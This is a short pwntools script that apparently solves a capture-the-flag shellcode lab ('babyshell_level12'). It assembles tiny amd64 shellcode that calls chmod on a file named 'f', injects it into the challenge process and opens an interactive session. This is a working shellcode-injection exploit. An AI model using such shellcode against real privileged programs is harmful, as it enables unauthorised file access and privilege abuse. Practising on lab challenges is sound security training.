from pwn import *

context.arch = 'amd64'
#context.log_level = "debug"

p = process('/challenge/babyshell_level12')

shellcode = """
    push 0x66
    mov rdi, rsp
    mov sil, 0x4
    mov al, 0x5a
    syscall
"""

# Assemble the shellcode
shellcode = asm(shellcode)
print(shellcode)
print(len(shellcode))

p.send(shellcode)

# Interact with the process
p.interactive()